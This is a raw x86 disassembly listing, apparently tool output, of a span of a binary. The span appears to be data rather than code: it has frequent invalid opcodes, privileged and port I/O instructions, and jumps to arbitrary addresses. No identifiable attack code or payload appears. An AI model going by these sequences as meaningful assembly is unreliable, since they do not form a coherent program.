  42e464:	std    
  42e465:	(bad)  
  42e466:	call   0x2ab3c8
  42e46b:	add    BYTE PTR [eax],al
  42e46d:	add    BYTE PTR [eax],al
  42e46f:	add    BYTE PTR [ecx+0x26fe2d56],dl
  42e475:	sbb    al,BYTE PTR [esi-0x28]
  42e478:	ss inc ecx
  42e47a:	hlt    
  42e47b:	mov    ds:0xe8e941d3,eax
  42e480:	fld    QWORD PTR [ebx-0x17]
  42e483:	call   DWORD PTR [ecx+0x5f]
  42e486:	dec    ebx
  42e487:	call   esi
  42e489:	je     0x42e460
  42e48b:	call   0x2bbd92
  42e490:	pushf  
  42e491:	inc    ecx
  42e492:	add    ebp,eax
  42e494:	(bad)  [ecx+0xe]
  42e497:	pop    edi
  42e498:	push   edi
  42e499:	arpl   WORD PTR [ebx-0x7d],ax
  42e49c:	sub    eax,0x1583acd6
  42e4a1:	stos   BYTE PTR es:[edi],al
  42e4a2:	inc    ecx
  42e4a3:	mov    edx,DWORD PTR [eax]
  42e4a5:	pop    ebx
  42e4a6:	out    0x15,eax
  42e4a8:	dec    ecx
  42e4a9:	lahf   
  42e4aa:	dec    esi
  42e4ab:	add    BYTE PTR [edx+0x5d],al
  42e4ae:	xor    ah,BYTE PTR [edx+esi*1]
  42e4b1:	mov    ch,0x32
  42e4b3:	and    BYTE PTR [ecx],dl
  42e4b5:	xchg   ebp,eax
  42e4b6:	sbb    bh,bh
  42e4b8:	ss sub eax,0x74e675ac
  42e4be:	aas    
  42e4bf:	and    al,0x90
  42e4c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e4c2:	imul   ecx,DWORD PTR [ebx+0x6c],0xffffffab
  42e4c6:	mov    dh,BYTE PTR [ebp-0x7c5f9310]
  42e4cc:	push   eax
  42e4cd:	ds dec esi
  42e4cf:	push   edx
  42e4d0:	push   0xf9ed37
  42e4d5:	add    BYTE PTR [eax],al
  42e4d7:	add    BYTE PTR [eax],al
  42e4d9:	ja     0x42e49f
  42e4db:	and    esp,DWORD PTR [esp+esi*4]
  42e4de:	int3   
  42e4df:	push   es
  42e4e0:	les    eax,FWORD PTR [ebx-0x4999efb5]
  42e4e6:	mov    es,WORD PTR [ebx+0x24]
  42e4e9:	test   BYTE PTR [edx+0x6d],al
  42e4ec:	out    dx,eax
  42e4ed:	cmp    BYTE PTR [edx],bl
  42e4ef:	adc    al,BYTE PTR [eax]
  42e4f1:	nop
  42e4f2:	and    DWORD PTR [ecx-0x14181b74],esp
  42e4f8:	xchg   BYTE PTR [esi-0x4d],al
  42e4fb:	outs   dx,BYTE PTR ds:[esi]
  42e4fc:	scas   eax,DWORD PTR es:[edi]
  42e4fd:	cs or  al,0x41
  42e500:	test   DWORD PTR [eax+0x5e],edx
  42e503:	jmp    0xf6eaa98e
  42e508:	out    0x77,eax
  42e50a:	test   eax,0x8fbfaa0
  42e50f:	loop   0x42e4d0
  42e511:	or     al,0x4b
  42e513:	and    al,0xd
  42e515:	or     edx,DWORD PTR [edi-0x68f4dc0a]
  42e51b:	neg    BYTE PTR [edi]
  42e51d:	clc    
  42e51e:	inc    esi
  42e51f:	pop    ebp
  42e520:	sti    
  42e521:	out    0xbd,eax
  42e523:	popf   
  42e524:	adc    al,0xe8
  42e526:	clc    
  42e527:	dec    edi
  42e528:	add    BYTE PTR ds:0xd217d688,dh
  42e52e:	add    dl,BYTE PTR [eax]
  42e530:	jg     0x42e4e6
  42e532:	loop   0x42e59d
  42e534:	std    
  42e535:	xchg   ebx,eax
  42e536:	cmp    ebp,DWORD PTR [eax+0x3]
  42e539:	ins    BYTE PTR es:[edi],dx
  42e53a:	xchg   ecx,eax
  42e53b:	push   esp
  42e53c:	inc    BYTE PTR [eax]
  42e53e:	add    BYTE PTR [eax],al
  42e540:	add    BYTE PTR [eax],al
  42e542:	inc    ebp
  42e543:	mov    dl,0x5d
  42e545:	dec    eax
  42e546:	ins    BYTE PTR es:[edi],dx
  42e547:	scas   eax,DWORD PTR es:[edi]
  42e548:	cld    
  42e549:	js     0x42e5a8
  42e54b:	lods   al,BYTE PTR ds:[esi]
  42e54c:	lods   al,BYTE PTR ds:[esi]
  42e54d:	sbb    eax,0xab711b93
  42e552:	call   0x3c03452
  42e557:	iret   
  42e558:	loope  0x42e5ac
  42e55a:	or     eax,0x918195f
  42e55f:	jg     0x42e572
  42e561:	add    DWORD PTR [edx+0xa],esp
  42e564:	pop    esi
  42e565:	dec    eax
  42e566:	lods   al,BYTE PTR ds:[esi]
  42e567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e568:	jp     0x42e5b2
  42e56a:	mov    ah,0xa6
  42e56c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e56d:	hlt    
  42e56e:	dec    eax
  42e56f:	or     edi,DWORD PTR [eax+0x79f44998]
  42e575:	les    ebx,FWORD PTR [edx-0x6ffbcfd2]
  42e57b:	mov    dl,0x88
  42e57d:	push   esi
  42e57e:	scas   al,BYTE PTR es:[edi]
  42e57f:	mov    ds:0x2646f57d,al
  42e584:	inc    edx
  42e585:	call   0xe8750f09
  42e58a:	(bad)
  42e58e:	push   cs
  42e58f:	loop   0x42e606
  42e591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e592:	stos   BYTE PTR es:[edi],al
  42e593:	repnz mov esi,0x56f11004
  42e599:	test   al,dl
  42e59b:	xchg   ecx,eax
  42e59c:	(bad)  
  42e59e:	adc    eax,0x75
  42e5a1:	lods   eax,DWORD PTR ds:[esi]
  42e5a2:	gs jnp 0x42e586
  42e5a5:	add    BYTE PTR [eax],al
  42e5a7:	add    BYTE PTR [eax],al
  42e5a9:	add    BYTE PTR [eax],al
  42e5ab:	and    dh,al
  42e5ad:	mov    eax,esp
  42e5af:	pop    ss
  42e5b0:	lahf   
  42e5b1:	mov    ebp,0xe5ce537c
  42e5b6:	or     eax,0x78
  42e5b9:	in     al,dx
  42e5ba:	call   FWORD PTR [edx-0x14e46c4]
  42e5c0:	sub    cl,BYTE PTR [edi]
  42e5c2:	in     eax,0xab
  42e5c4:	sub    al,0x53
  42e5c6:	lds    eax,FWORD PTR [ebx+0x4f70566d]
  42e5cc:	into   
  42e5cd:	(bad)  
  42e5ce:	rcl    edx,cl
  42e5d0:	test   al,0xa4
  42e5d2:	sub    dh,BYTE PTR [ebp-0x50]
  42e5d5:	aam    0xe5
  42e5d7:	jnp    0x42e5a2
  42e5d9:	pop    ds
  42e5da:	sbb    eax,DWORD PTR [edx+esi*8]
  42e5dd:	dec    ecx
  42e5de:	ss inc esi
  42e5e0:	stc    
  42e5e1:	iret   
  42e5e2:	out    0xf9,al
  42e5e4:	in     al,dx
  42e5e5:	nop    DWORD PTR [esi]
  42e5e8:	in     eax,0x61
  42e5ea:	repnz pop eax
  42e5ec:	mov    dl,0x60
  42e5ee:	xchg   esp,eax
  42e5ef:	xchg   ebx,eax
  42e5f0:	mov    dl,0x8e
  42e5f2:	sub    cl,BYTE PTR [ebp+0x5962480b]
  42e5f8:	lea    edx,[ecx]
  42e5fa:	mov    edx,0xf7e3595d
  42e5ff:	adc    eax,0x48e261e5
  42e604:	mov    dl,0x70
  42e606:	cmp    BYTE PTR [ebp-0x4e],0x8e
  42e60a:	stos   BYTE PTR es:[edi],al
  42e60b:	xchg   ebx,eax
  42e60c:	or     edx,DWORD PTR [eax+0x72]
  42e60f:	add    BYTE PTR [eax],al
  42e611:	add    BYTE PTR [eax],al
  42e613:	add    al,cl
  42e615:	into   
  42e616:	sub    al,BYTE PTR [ebx-0x6d]
  42e619:	pop    esp
  42e61a:	xchg   edx,eax
  42e61b:	stos   DWORD PTR es:[edi],eax
  42e61c:	leave  
  42e61d:	stos   DWORD PTR es:[edi],eax
  42e61e:	shr    eax,cl
  42e620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e621:	mov    BYTE PTR [esi+ecx*2+0x14],dh
  42e625:	xor    al,0x13
  42e627:	ret    0x8cf1
  42e62a:	psubd  mm0,mm1
  42e62d:	pop    eax
  42e62e:	jecxz  0x42e5cf
  42e630:	sbb    ebp,esp
  42e632:	popa   
  42e633:	icebp  
  42e634:	(bad)  
  42e635:	mov    cl,0x7b
  42e637:	sbb    ebp,DWORD PTR [edi+0x5f4f7b2]
  42e63d:	outs   dx,DWORD PTR ds:[esi]
  42e63e:	xor    al,BYTE PTR [eax]
  42e640:	int    0xad
  42e642:	popa   
  42e643:	or     dh,dh
  42e645:	lods   al,BYTE PTR ds:[esi]
  42e646:	js     0x42e6ad
  42e648:	mov    ch,0xae
  42e64a:	repz push es
  42e64c:	imul   BYTE PTR [ebx+ecx*2+0x74aebc6f]
  42e653:	add    edx,ecx
  42e655:	mov    al,0xc6
  42e657:	maskmovq mm6,(bad)
  42e658:	div    DWORD PTR [esi]
  42e65a:	dec    ebx
  42e65b:	mov    bh,BYTE PTR [edx+0x79390ff8]
  42e661:	jge    0x42e6aa
  42e663:	pop    esi
  42e664:	jmp    0x6bb6:0x65c233fa
  42e66b:	in     al,dx
  42e66c:	or     eax,0x2a241833
  42e671:	mov    eax,DWORD PTR [eax+0x57]
  42e674:	loop   0x42e692
  42e676:	hlt    
  42e677:	inc    ebx
  42e678:	add    BYTE PTR [eax],al
  42e67a:	add    BYTE PTR [eax],al
  42e67c:	add    bh,ch
  42e67e:	mov    dh,0xe
  42e680:	test   BYTE PTR [ecx-0x56],bh
  42e683:	sbb    bh,BYTE PTR [eax+0xeb972]
  42e689:	pop    ss
  42e68a:	fisttp WORD PTR [edi+0x24]
  42e68d:	pop    ecx
  42e68e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e68f:	adc    ecx,DWORD PTR [ebp+0x501bd9f5]
  42e695:	cs retf 
  42e697:	(bad)  
  42e698:	adc    ch,BYTE PTR [ecx-0x4a]
  42e69b:	div    BYTE PTR [ebx]
  42e69d:	mov    ds:0x418be920,eax
  42e6a2:	in     eax,0xdd
  42e6a4:	mov    ebp,0xebb2d
  42e6a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e6aa:	cmp    ebp,ecx
  42e6ac:	jne    0x42e69f
  42e6ae:	and    BYTE PTR [ebx],al
  42e6b0:	push   esp
  42e6b1:	enter  0xe75,0xeb
  42e6b5:	fisttp WORD PTR [eax-0x3b1aea19]
  42e6bb:	dec    esi
  42e6bc:	add    BYTE PTR [eax-0x6ffef1fa],dl
  42e6c2:	(bad)  [esi]
  42e6c4:	cmp    al,BYTE PTR [ebx-0x6c1884b3]
  42e6ca:	fisttp DWORD PTR [edi]
  42e6cc:	xchg   ebx,edx
  42e6ce:	jo     0x42e672
  42e6d0:	mov    WORD PTR [edi+esi*8-0x11],ds
  42e6d4:	dec    ebp
  42e6d5:	adc    eax,0xa813f430
  42e6da:	add    eax,0x1c97faba
  42e6df:	xchg   esp,eax
  42e6e0:	mov    edi,0x0
  42e6e5:	add    BYTE PTR [esp+edi*4],al
  42e6e8:	addr16 push ebx
  42e6ea:	lods   al,BYTE PTR ds:[esi]
  42e6eb:	dec    DWORD PTR [esi-0x75444bb5]
  42e6f1:	push   esp
  42e6f2:	mov    eax,0x787ebca8
  42e6f7:	(bad)  [ebx]
  42e6f9:	push   ss
  42e6fa:	fsub   DWORD PTR [ebx]
  42e6fc:	and    al,0x6
  42e6fe:	(bad)  
  42e6ff:	push   ebx
  42e700:	xchg   esi,edi
  42e702:	push   edi
  42e703:	(bad)  
  42e705:	out    dx,eax
  42e706:	ret    0xdd78
  42e709:	mov    edi,0x573f19e7
  42e70e:	adc    edx,DWORD PTR [edi-0x247741d5]
  42e714:	pop    edi
  42e715:	add    BYTE PTR [ebx],bh
  42e717:	in     eax,dx
  42e718:	inc    edx
  42e719:	or     ebx,edi
  42e71b:	or     DWORD PTR [edx-0x79],eax
  42e71e:	sbb    cl,ah
  42e720:	shr    BYTE PTR [esi],cl
  42e722:	inc    edx
  42e723:	xor    ebp,0x310d0503
  42e729:	inc    eax
  42e72a:	nop
  42e72b:	lods   al,BYTE PTR ds:[esi]
  42e72c:	test   BYTE PTR [esi+0x5da72694],0x50
  42e733:	fucomi st,st(2)
  42e735:	mov    dl,0xda
  42e737:	push   esp
  42e738:	push   ss
  42e739:	or     BYTE PTR [edx-0x1049064e],ah
  42e73f:	push   ebx
  42e740:	xor    eax,0x37f4a604
  42e745:	jl     0x42e6da
  42e747:	stos   DWORD PTR es:[edi],eax
  42e748:	adc    ebp,ecx
  42e74a:	add    BYTE PTR [eax],al
  42e74c:	add    BYTE PTR [eax],al
  42e74e:	add    BYTE PTR [ebx+0x502267e7],ah
  42e754:	mov    dl,0xe7
  42e756:	iret   
  42e757:	mov    ch,BYTE PTR [ecx]
  42e759:	cli    
  42e75a:	mov    dh,0xbd
  42e75c:	push   ebx
  42e75d:	xor    eax,0x2db5d204
  42e762:	add    al,0x3b
  42e764:	nop
  42e765:	cmp    BYTE PTR [ecx+0x42],dl
  42e768:	ror    DWORD PTR [ebx+esi*4-0xeca5c1e],0x8a
  42e770:	cmp    al,0x30
  42e772:	es (bad) 
  42e774:	mov    dh,0x22
  42e776:	mov    dl,0xd5
  42e778:	jb     0x42e76f
  42e77a:	xor    BYTE PTR [ebx+edi*1+0x5563b6f2],ah
  42e781:	mov    ch,0x3
  42e783:	mov    esp,DWORD PTR [edi]
  42e785:	and    eax,0xf2308b26
  42e78a:	adc    ebx,DWORD PTR [ebx+0x37b6f228]
  42e790:	push   ebp
  42e791:	mov    ch,0x3
  42e793:	mov    dl,0xa3
  42e795:	sbb    eax,0x1dff6726
  42e79a:	lods   eax,DWORD PTR ds:[esi]
  42e79b:	das    
  42e79c:	lock cmc 
  42e79e:	and    eax,0x263cfa87
  42e7a3:	or     DWORD PTR [edi-0x51a0d9d8],edi
  42e7a9:	retf   0x6db1
  42e7ac:	jb     0x42e7a3
  42e7ae:	xor    esp,edx
  42e7b0:	mov    edi,0x76c
  42e7b5:	add    BYTE PTR [eax],al
  42e7b7:	add    BYTE PTR ds:0x904457e5,al
  42e7bd:	(bad)  
  42e7be:	push   cs
  42e7bf:	cli    
  42e7c0:	sub    cl,BYTE PTR [edx-0x4f189f8c]
  42e7c6:	inc    edi
  42e7c7:	stos   BYTE PTR es:[edi],al
  42e7c8:	inc    esi
  42e7c9:	aaa    
  42e7ca:	sti    
  42e7cb:	push   0x2f
  42e7cd:	call   0xb3666d5f
  42e7d2:	push   cs
  42e7d3:	jmp    0x19759b1e
  42e7d8:	pushf  
  42e7d9:	lock or eax,0x1eb93e9
  42e7df:	test   DWORD PTR [esi-0x2489f18e],eax
  42e7e5:	enter  0xa9ce,0x18
  42e7e9:	(bad)  
  42e7ea:	dec    ecx
  42e7eb:	sub    ah,ah
  42e7ed:	xchg   esi,eax
  42e7ee:	(bad)  
  42e7ef:	cld    
  42e7f0:	shl    DWORD PTR [edx-0xbbd9dbc],cl
  42e7f6:	adc    al,0xbd
  42e7f8:	lock scas eax,DWORD PTR es:[edi]
  42e7fa:	push   cs
  42e7fb:	aaa    
  42e7fc:	mov    ?,edx
  42e7fe:	nop
  42e7ff:	lods   eax,DWORD PTR ds:[esi]
  42e800:	xchg   ebx,eax
  42e801:	mov    cl,0x61
  42e803:	icebp  
  42e804:	mov    esp,0xd76b672b
  42e809:	mov    dl,0x43
  42e80b:	push   ds
  42e80c:	jle    0x42e7f0
  42e80e:	add    BYTE PTR [ecx+0x2911e493],ch
  42e814:	adc    DWORD PTR [ebx+0xe],esi
  42e817:	call   0x5139b0a2
  42e81c:	add    BYTE PTR [eax],al
  42e81e:	add    BYTE PTR [eax],al
  42e820:	add    ah,ah
  42e822:	jmp    0x42e80f
  42e824:	ins    DWORD PTR es:[edi],dx
  42e825:	push   ebx
  42e826:	arpl   bp,di
  42e828:	push   0x2d912f26
  42e82d:	xchg   esp,eax
  42e82e:	mov    cl,0xd3
  42e830:	in     al,0xd7
  42e832:	ins    BYTE PTR es:[edi],dx
  42e833:	push   edx
  42e834:	jmp    0xe9940811
  42e839:	(bad)  
  42e83a:	jmp    0x42e83d
  42e83c:	add    cl,ah
  42e83e:	(bad)  
  42e83f:	dec    esi
  42e840:	add    BYTE PTR [esi-0xedbb090],dl
  42e846:	aaa    
  42e847:	push   esi
  42e848:	add    al,0x36
  42e84a:	aaa    
  42e84b:	outs   dx,BYTE PTR ds:[esi]
  42e84c:	or     cl,ch
  42e84e:	push   0x4d
  42e850:	or     al,0x63
  42e852:	jb     0x42e886
  42e854:	or     al,0x31
  42e856:	je     0x42e871
  42e858:	mov    ebp,edi
  42e85a:	jnp    0x42e808
  42e85c:	or     BYTE PTR [ecx-0x110e6c80],ch
  42e862:	mov    bl,0x62
  42e864:	mov    ds:0xa9f6b679,eax
  42e869:	mov    eax,0xedf60eb2
  42e86e:	push   cs
  42e86f:	adc    al,0x1
  42e871:	mov    ebp,0xd1ce93b3
  42e876:	sbb    bl,0xff
  42e879:	(bad)  
  42e87a:	ins    DWORD PTR es:[edi],dx
  42e87b:	int    0x5e
  42e87d:	stos   DWORD PTR es:[edi],eax
  42e87e:	mov    dl,0xe
  42e880:	push   ebp
  42e881:	add    cl,BYTE PTR [ebx-0x71]
  42e884:	in     al,dx
  42e885:	add    BYTE PTR [eax],al
  42e887:	add    BYTE PTR [eax],al
  42e889:	add    BYTE PTR [ecx],ah
  42e88b:	mov    bh,0xe
  42e88d:	add    bh,bh
  42e88f:	ins    BYTE PTR es:[edi],dx
  42e890:	ficom  WORD PTR [edi-0x52]
  42e893:	mov    al,0x62
  42e895:	mov    ds:0x5e0b229,eax
  42e89a:	jns    0x42e8d0
  42e89c:	push   eax
  42e89d:	add    BYTE PTR [eax],bh
  42e89f:	mov    ds:0x3811bf20,eax
  42e8a4:	push   eax
  42e8a5:	add    BYTE PTR [esi],bl
  42e8a7:	sbb    DWORD PTR [ebx],eax
  42e8a9:	lock dec ebx
  42e8ab:	jb     0x42e8bb
  42e8ad:	imul   BYTE PTR [edx+esi*8]
  42e8b0:	imul   eax,DWORD PTR [ecx+ebp*1-0x49],0xba411a61
  42e8b8:	out    0xff,eax
  42e8ba:	nop
  42e8bb:	add    al,0x6c
  42e8bd:	mov    edi,0xc8fea7c
  42e8c2:	rcr    BYTE PTR [ecx+0x2b],1
  42e8c5:	add    BYTE PTR [ecx+0x12c40f14],dl
  42e8cb:	mov    al,ds:0x9a23dd12
  42e8d0:	adc    dl,BYTE PTR [ebx-0x21]
  42e8d3:	out    dx,al
  42e8d4:	xchg   DWORD PTR ds:0x7c6cdb50,ecx
  42e8da:	cwde   
  42e8db:	test   al,0x65
  42e8dd:	inc    esp
  42e8de:	les    ebp,FWORD PTR [ebx+0x36088465]
  42e8e4:	mov    ecx,0xec360fa
  42e8e9:	and    BYTE PTR [eax+0xfb07db],dl
  42e8ef:	add    BYTE PTR [eax],al
  42e8f1:	add    BYTE PTR [eax],al
  42e8f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e8f4:	fisttp DWORD PTR [edi]
  42e8f6:	mov    bh,0x24
  42e8f8:	fimul  DWORD PTR [edi]
  42e8fa:	add    BYTE PTR [edi],bh
  42e8fc:	bound  edx,QWORD PTR [esi-0x4]
  42e8ff:	(bad)  
  42e900:	out    dx,al
  42e901:	jecxz  0x42e914
  42e903:	rcr    bl,1
  42e905:	mov    ?,WORD PTR [edi-0x72baf6fc]
  42e90b:	or     eax,0x6ffab563
  42e910:	icebp  
  42e911:	(bad)  
  42e913:	addr16 push es
  42e915:	xor    BYTE PTR [edx],dl
  42e917:	rcr    bl,1
  42e919:	xchg   esp,eax
  42e91a:	ret    
  42e91b:	test   BYTE PTR [eax+0x76],bl
  42e91e:	jecxz  0x42e96e
  42e920:	les    edi,FWORD PTR [eax+0x547eb01]
  42e926:	jg     0x42e925
  42e928:	mov    esi,0xa37fab5
  42e92d:	jmp    0xa92839c6
  42e932:	and    edx,DWORD PTR [edx+0x2b0d4d53]
  42e938:	mov    dl,0xf9
  42e93a:	rcl    ecx,0xbf
  42e93d:	idiv   BYTE PTR [esp+ebx*1+0x6]
  42e941:	les    ebp,FWORD PTR [ecx+0x3d3da0a]
  42e947:	nop
  42e948:	mov    dl,0x78
  42e94a:	and    cl,BYTE PTR [eax-0x6bd5a14e]
  42e950:	cmp    bh,BYTE PTR [eax+edi*8]
  42e953:	dec    edx
  42e954:	cmp    DWORD PTR [edx+ecx*2+0x0],esi
  42e95b:	add    cl,cl
  42e95d:	out    dx,eax
  42e95e:	stc    
  42e95f:	add    ecx,DWORD PTR [edi]
  42e961:	xchg   cl,dl
  42e963:	call   DWORD PTR [esi]
  42e965:	jo     0x42e960
  42e967:	jp     0x42e9b9
  42e969:	mov    dh,0x70
  42e96b:	inc    esi
  42e96c:	mov    BYTE PTR [ecx],dh
  42e96e:	and    BYTE PTR [eax],al
  42e970:	mov    ebx,0x15fc373a
  42e975:	jo     0x42e968
  42e977:	test   BYTE PTR [ebp-0x46],al
  42e97a:	cmc    
  42e97b:	jnp    0x42e9cd
  42e97d:	mov    esi,0x3a85465f
  42e982:	mov    bh,0xf6
  42e984:	push   ss
  42e985:	jno    0x42e96c
  42e987:	jp     0x42e959
  42e989:	ret    0x37
  42e98c:	nop
  42e98d:	test   BYTE PTR [eax-0x4d],ah
  42e990:	imul   BYTE PTR [ecx+esi*8-0x58]
  42e994:	jecxz  0x42e94c
  42e996:	gs add ecx,edx
  42e999:	out    dx,eax
  42e99a:	int3   
  42e99b:	jno    0x42e96e
  42e99d:	mov    ebp,0xbcdc3bac
  42e9a2:	popf   
  42e9a3:	das    
  42e9a4:	xchg   esp,eax
  42e9a5:	mov    al,ds:0x58789d35
  42e9aa:	test   DWORD PTR [ebp-0x4a],0x66ff00c1
  42e9b1:	add    BYTE PTR [eax+0xf38921d],bh
  42e9b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e9b8:	pop    ds
  42e9b9:	mov    esi,esi
  42e9bb:	mov    edx,DWORD PTR [edx+0x3e0eb2]
  42e9c1:	add    BYTE PTR [eax],al
  42e9c3:	add    BYTE PTR [eax],al
  42e9c5:	mov    esi,0x2ff4eb82
  42e9ca:	(bad)  
  42e9cb:	dec    esi
  42e9cc:	jmp    0xd1d2e4cd
  42e9d1:	sub    BYTE PTR [ebx],bh
  42e9d3:	push   ebp
  42e9d4:	in     eax,dx
  42e9d5:	clc    
  42e9d6:	inc    esi
  42e9d7:	iret   
  42e9d8:	push   ds
  42e9d9:	pop    edx
  42e9da:	sub    eax,DWORD PTR [ebp+0x62]
  42e9dd:	and    ch,BYTE PTR [ebp+0x6c]
  42e9e0:	loope  0x42e975
  42e9e2:	data16 sbb dh,BYTE PTR [edx+0x51]
  42e9e6:	ret    0x2527
  42e9e9:	mov    al,0xb3
  42e9eb:	sbb    edi,DWORD PTR [ebp-0x2d]
  42e9ee:	aam    0x26
  42e9f0:	ss jmp 0x542200bc
  42e9f6:	mov    dl,0x95
  42e9f8:	daa    
  42e9f9:	lods   al,BYTE PTR ds:[esi]
  42e9fa:	ss iret 
  42e9fc:	std    
  42e9fd:	mov    al,0x34
  42e9ff:	imul   eax,ebp,0xffffffa7
  42ea02:	cmp    BYTE PTR [esi],0x66
  42ea05:	popa   
  42ea06:	mov    dh,0xeb
  42ea08:	hlt    
  42ea09:	xchg   ebx,eax
  42ea0a:	ror    BYTE PTR [esi-0x17],0x6
  42ea0e:	sub    al,0x62
  42ea10:	out    0xfa,al
  42ea12:	imul   edi,esi,0x1bd39278
  42ea18:	mov    eax,ds:0x23dcebba
  42ea1e:	(bad)  
  42ea1f:	dec    esi
  42ea20:	jmp    0xe9593b39
  42ea25:	pop    ebp
  42ea26:	sub    ecx,DWORD PTR [edi+edi*4+0x0]
  42ea2a:	add    BYTE PTR [eax],al
  42ea2c:	add    BYTE PTR [eax],al
  42ea2e:	push   ebp
  42ea2f:	scas   eax,DWORD PTR es:[edi]
  42ea30:	push   cs
  42ea31:	mov    edi,0x8f8fe2c4
  42ea36:	aas    
  42ea37:	call   0xcd73ea9e
  42ea3c:	in     al,dx
  42ea3d:	(bad)  
  42ea3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ea3f:	jmp    0x42ea29
  42ea41:	adc    eax,0x4ebc85
  42ea46:	mov    cs:0xcf14ff12,al
  42ea4c:	std    
  42ea4d:	aas    
  42ea4e:	stc    
  42ea4f:	das    
  42ea50:	push   esi
  42ea51:	add    al,0xde
  42ea53:	cs data16 or cl,ch
  42ea57:	call   0x15e8:0xeeb7ff19
  42ea5e:	sub    ecx,eax
  42ea60:	dec    esi
  42ea61:	add    BYTE PTR [edx-0x34],bh
  42ea64:	push   ss
  42ea65:	add    BYTE PTR [edi-0x274bd11],cl
  42ea6b:	cs clc 
  42ea6d:	dec    esp
  42ea6e:	xchg   DWORD PTR [edi-0x22],esp
  42ea71:	push   0xffffffb8
  42ea73:	adc    ebx,DWORD PTR [esi+0x4]
  42ea76:	push   cs
  42ea77:	rol    edx,0x15
  42ea7a:	imul   esi,DWORD PTR [esi-0x155a3f6f],0x9012c039
  42ea84:	xchg   ebx,eax
  42ea85:	push   es
  42ea86:	xchg   ebx,eax
  42ea87:	(bad)  
  42ea88:	call   0xeece:0x9385494d
  42ea8f:	jle    0x42eaa3
  42ea91:	test   DWORD PTR [eax],eax
  42ea93:	add    BYTE PTR [eax],al
  42ea95:	add    BYTE PTR [eax],al
  42ea97:	mov    ecx,0x1c74f791
  42ea9c:	adc    DWORD PTR [ebx],eax
  42ea9e:	xor    BYTE PTR [edi+0x76],dl
  42eaa1:	push   cs
  42eaa2:	cmp    eax,0xffec096a
  42eaa7:	and    al,0xf2
  42eaa9:	call   0x52ae2823
  42eaae:	mov    ah,0x1
  42eab0:	(bad)  
  42eab1:	das    
  42eab2:	add    BYTE PTR [ecx],bh
  42eab4:	xchg   BYTE PTR [ecx+eiz*1-0x70],dh
  42eab8:	push   esp
  42eab9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eaba:	out    0x90,eax
  42eabc:	ror    DWORD PTR [edi],1
  42eabe:	add    BYTE PTR ds:0x26bf1d9c,cl
  42eac4:	(bad)  
  42eac6:	pop    ds
  42eac7:	pushf  
  42eac8:	(bad)  
  42eac9:	cli    
  42eaca:	inc    esp
  42eacb:	dec    esp
  42eacc:	pop    edi
  42eacd:	add    dh,dl
  42eacf:	int    0x47
  42ead1:	adc    esi,DWORD PTR [esi+eax*2+0x5d]
  42ead5:	ss mov eax,0xfa628790
  42eadb:	test   DWORD PTR [ebx-0x77],eax
  42eade:	(bad)  
  42eadf:	mul    BYTE PTR [esi-0x207a055a]
  42eae5:	sbb    DWORD PTR [eax-0x70],eax
  42eae8:	hlt    
  42eae9:	xchg   ebx,eax
  42eaea:	scas   eax,DWORD PTR es:[edi]
  42eaeb:	xchg   ecx,eax
  42eaec:	mov    ecx,0xdb88bda9
  42eaf1:	xchg   DWORD PTR ds:[edx+ebx*2-0x246e887d],edi
  42eaf9:	jge    0x42eaff
  42eaff:	add    BYTE PTR [ebp+0x37],dl
  42eb02:	inc    eax
  42eb03:	lea    ecx,ds:0xaffab164
  42eb09:	retf   
  42eb0a:	or     al,BYTE PTR [eax+esi*2]
  42eb0d:	fisttp DWORD PTR [edi]
  42eb0f:	push   0xf589f
  42eb14:	inc    ecx
  42eb15:	cwde   
  42eb16:	dec    esi
  42eb17:	cld    
  42eb18:	add    al,0xdb
  42eb1a:	sldt   WORD PTR [edi-0x2fee1c1a]
  42eb21:	fisttp DWORD PTR [esi+0x68defdbf]
  42eb27:	mov    WORD PTR [ecx+ebp*4-0x4c],es
  42eb2b:	cli    
  42eb2c:	js     0x42eb33
  42eb2e:	adc    BYTE PTR [eax],al
  42eb30:	nop
  42eb31:	xchg   edx,eax
  42eb32:	shr    BYTE PTR ds:0xc21eb250,1
  42eb38:	call   0xadbc:0xbc3b3720
  42eb3f:	das    
  42eb40:	aas    
  42eb41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eb42:	xor    eax,0xadc1adc2
  42eb47:	ret    0xb4b5
  42eb4a:	lods   eax,DWORD PTR ds:[esi]
  42eb4b:	ret    0x7bd8
  42eb4e:	imul   edi,edx,0x2fc2db9e
  42eb54:	pop    ss
  42eb55:	mov    ds:0xb43fc1b5,eax
  42eb5a:	mov    eax,0xf4f59074
  42eb5f:	ins    DWORD PTR es:[edi],dx
  42eb60:	push   eax
  42eb61:	mov    dh,0x2d
  42eb63:	xor    BYTE PTR [eax],al
  42eb65:	add    BYTE PTR [eax],al
  42eb67:	add    BYTE PTR [eax],al
  42eb69:	mov    ?,WORD PTR [edx+0x29]
  42eb6c:	add    DWORD PTR [edi-0x7be5470e],edi
  42eb72:	mov    bh,BYTE PTR [eax-0x47757fe6]
  42eb78:	cmc    
  42eb79:	and    dh,BYTE PTR [ebx-0x49bbc3e3]
  42eb7f:	js     0x42eb1d
  42eb81:	pushf  
  42eb82:	pop    esi
  42eb83:	clc    
  42eb84:	lock push esp
  42eb87:	invd   
  42eb89:	pop    eax
  42eb8a:	cmc    
  42eb8b:	call   DWORD PTR [ebx]
  42eb8d:	dec    eax
  42eb8e:	cmc    
  42eb8f:	add    bh,BYTE PTR [ecx-0x45]
  42eb92:	or     BYTE PTR [ebx],0x79
  42eb95:	mov    al,ds:0x9aa5add9
  42eb9a:	call   0xe7d30544
  42eb9f:	ret    0x18fb
  42eba2:	outs   dx,BYTE PTR ds:[esi]
  42eba3:	inc    ecx
  42eba4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eba5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eba6:	push   edx
  42eba7:	jecxz  0x42ebec
  42eba9:	nop
